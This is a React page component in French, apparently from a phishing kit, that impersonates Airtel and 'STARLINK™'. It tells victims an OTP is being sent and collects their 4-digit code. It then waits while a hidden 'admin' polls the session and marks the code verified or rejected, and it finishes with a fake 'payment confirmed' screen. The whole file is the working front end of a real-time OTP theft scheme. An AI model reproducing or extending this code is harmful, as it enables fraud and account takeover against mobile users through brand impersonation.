import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, CheckCircle, XCircle } from 'lucide-react';
import airtelLogo from '@assets/image_1784479304453.png';
import {
  useGetSession,
  getGetSessionQueryKey,
  useSubmitOtp,
} from '@workspace/api-client-react';

type Stage = 'waiting_for_admin' | 'otp_entry' | 'awaiting_confirm' | 'verified' | 'rejected';

const OTP_COUNTDOWN_SECONDS = 30;

export default function Verify() {
  const [stage, setStage] = useState<Stage>('waiting_for_admin');
  const [otp, setOtp] = useState(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(OTP_COUNTDOWN_SECONDS);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const sessionId = (history.state?.usr?.sessionId ?? '') as string;
  const phoneNumber = (history.state?.usr?.phoneNumber ?? '') as string;

  // Poll session — active during waiting_for_admin AND awaiting_confirm
  const shouldPoll = stage === 'waiting_for_admin' || stage === 'awaiting_confirm';

  const { data: sessionData } = useGetSession(sessionId, {
    query: {
      enabled: !!sessionId && shouldPoll,
      queryKey: getGetSessionQueryKey(sessionId),
      refetchInterval: shouldPoll ? 2000 : false,
    },
  });

  // React to status changes from polling
  useEffect(() => {
    if (!sessionData) return;
    const { status } = sessionData;

    if (stage === 'waiting_for_admin' && status === 'otp_sent') {
      // Admin confirmed OTP was sent — move to OTP entry with fresh countdown
      setTimeLeft(OTP_COUNTDOWN_SECONDS);
      setOtp(['', '', '', '']);
      setStage('otp_entry');
    }

    if (stage === 'awaiting_confirm') {
      if (status === 'verified') setStage('verified');
      if (status === 'rejected') setStage('rejected');
    }
  }, [sessionData, stage]);

  // Countdown timer — only ticks during OTP entry stage
  useEffect(() => {
    if (stage !== 'otp_entry') return;
    if (timeLeft <= 0) return;
    const id = setInterval(() => setTimeLeft((prev) => Math.max(0, prev - 1)), 1000);
    return () => clearInterval(id);
  }, [stage, timeLeft]);

  const submitOtp = useSubmitOtp({
    mutation: {
      onSuccess: () => setStage('awaiting_confirm'),
    },
  });

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.slice(-1);
    setOtp(next);
    if (value && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasted) return;
    const next = [...otp];
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i];
    setOtp(next);
    inputRefs.current[Math.min(pasted.length, 3)]?.focus();
  };

  const handleConfirm = () => {
    if (!sessionId || otp.some((d) => !d)) return;
    submitOtp.mutate({ id: sessionId, data: { otp: otp.join('') } });
  };

  const handleRetry = () => {
    setOtp(['', '', '', '']);
    setTimeLeft(OTP_COUNTDOWN_SECONDS);
    setStage('otp_entry');
    setTimeout(() => inputRefs.current[0]?.focus(), 50);
  };

  return (
    <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center relative overflow-hidden">
      <AnimatePresence mode="wait">

        {/* ── Waiting for admin to send OTP ── */}
        {stage === 'waiting_for_admin' && (
          <motion.div
            key="waiting"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-waiting-admin"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-14 w-auto object-contain mb-12" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Envoi du code OTP...</h2>
            <p className="text-muted-foreground font-medium max-w-xs">
              Votre code OTP est en cours d'envoi vers&nbsp;
              <strong className="text-foreground">{phoneNumber || 'votre numéro'}</strong>.
              <br />
              Veuillez patienter.
            </p>
          </motion.div>
        )}

        {/* ── OTP entry ── */}
        {stage === 'otp_entry' && (
          <motion.div
            key="otp"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="w-full max-w-md px-4 flex flex-col items-center"
            data-testid="view-otp"
          >
            <div className="w-full bg-card rounded-3xl shadow-sm border border-card-border p-8 mb-8 text-center">
              <h1 className="text-2xl font-black text-foreground mb-2 tracking-tight">Vérification OTP</h1>
              <p className="text-muted-foreground text-sm font-medium mb-6">
                Entrez l'OTP reçu sur votre téléphone
                <br />
                <strong className="text-foreground text-base mt-2 inline-block font-bold">{phoneNumber}</strong>
              </p>

              <div className="mb-8">
                <label className="block text-sm font-bold text-foreground mb-4">
                  Code OTP à 4 chiffres
                </label>
                <div className="flex justify-center gap-3 md:gap-4" onPaste={handlePaste}>
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="\d*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-14 h-16 md:w-16 md:h-20 text-center text-3xl font-black rounded-2xl border-2 border-input bg-secondary/30 focus:bg-card focus:border-primary focus:ring-4 focus:ring-primary/20 outline-none transition-all"
                      data-testid={`input-otp-${index}`}
                    />
                  ))}
                </div>
              </div>

              {submitOtp.isError && (
                <p className="text-sm text-destructive font-medium mb-4">
                  Erreur. Veuillez réessayer.
                </p>
              )}

              <button
                className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 shadow-md shadow-primary/20 disabled:opacity-50 disabled:pointer-events-none flex items-center justify-center gap-2"
                disabled={otp.some((d) => !d) || submitOtp.isPending}
                onClick={handleConfirm}
                data-testid="button-verify-submit"
              >
                {submitOtp.isPending ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Envoi...
                  </>
                ) : (
                  'CONFIRMER'
                )}
              </button>

              <div className="mt-6 text-sm font-medium text-muted-foreground" data-testid="text-countdown">
                {timeLeft > 0 ? (
                  <span>
                    Code valide pendant{' '}
                    <strong className="text-foreground tabular-nums">{timeLeft}</strong> secondes
                  </span>
                ) : (
                  <span className="text-muted-foreground">Code expiré — contactez le support</span>
                )}
              </div>
            </div>

            <div className="flex flex-col items-center gap-3 opacity-70">
              <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                En collaboration avec STARLINK™
              </span>
              <img src={airtelLogo} alt="Airtel Logo" className="h-7 w-auto object-contain grayscale" />
            </div>
          </motion.div>
        )}

        {/* ── Awaiting admin confirmation of OTP ── */}
        {stage === 'awaiting_confirm' && (
          <motion.div
            key="awaiting"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-awaiting"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-14 w-auto object-contain mb-10" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Vérification en cours...</h2>
            <p className="text-muted-foreground font-medium max-w-xs">
              Votre OTP est en cours de validation. Cela prend généralement quelques secondes.
            </p>
          </motion.div>
        )}

        {/* ── Verified (success) ── */}
        {stage === 'verified' && (
          <motion.div
            key="success"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-success"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mb-6">
              <CheckCircle className="w-10 h-10 text-primary" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-success-title">
              Paiement confirmé !
            </h2>
            <p className="text-muted-foreground font-medium mb-2">
              Votre forfait internet a été activé avec succès.
            </p>
            <p className="text-sm text-muted-foreground">{phoneNumber}</p>
          </motion.div>
        )}

        {/* ── Rejected — allow retry ── */}
        {stage === 'rejected' && (
          <motion.div
            key="rejected"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-rejected"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-destructive/10 flex items-center justify-center mb-6">
              <XCircle className="w-10 h-10 text-destructive" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-rejected-title">
              Code incorrect
            </h2>
            <p className="text-muted-foreground font-medium mb-6">
              L'OTP saisi est invalide. Veuillez réessayer.
            </p>
            <button
              onClick={handleRetry}
              className="px-8 py-3 bg-primary text-primary-foreground font-bold rounded-xl hover:bg-primary/90 transition-all shadow-md shadow-primary/20"
              data-testid="button-retry"
            >
              Ressaisir le code
            </button>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}
